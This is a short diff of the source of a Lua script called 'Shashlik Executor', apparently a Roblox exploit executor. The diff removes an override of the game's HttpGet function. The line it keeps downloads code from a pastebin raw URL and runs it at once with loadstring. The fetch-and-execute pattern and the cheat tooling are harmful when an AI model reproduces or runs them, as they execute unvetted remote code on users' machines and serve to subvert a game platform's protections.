@@ -3,13 +3,6 @@ Shashlik Executor Source!!! Current Version is: 5.0 → GUI Updated to Modern St
 Credits to Maksimilianych228 and Gerdroid
 ]]
 --[[ MAIN SCRIPTS ]]--
-
-local oldHttpGet = game.HttpGet
-getgenv().game.HttpGet = function(self, url)
-    return oldHttpGet(game, url)
-end
-
-
 task.spawn(function()
   --//fast console button
   loadstring(game:HttpGet("https://pastebin.com/raw/3KcF9M0m"))()
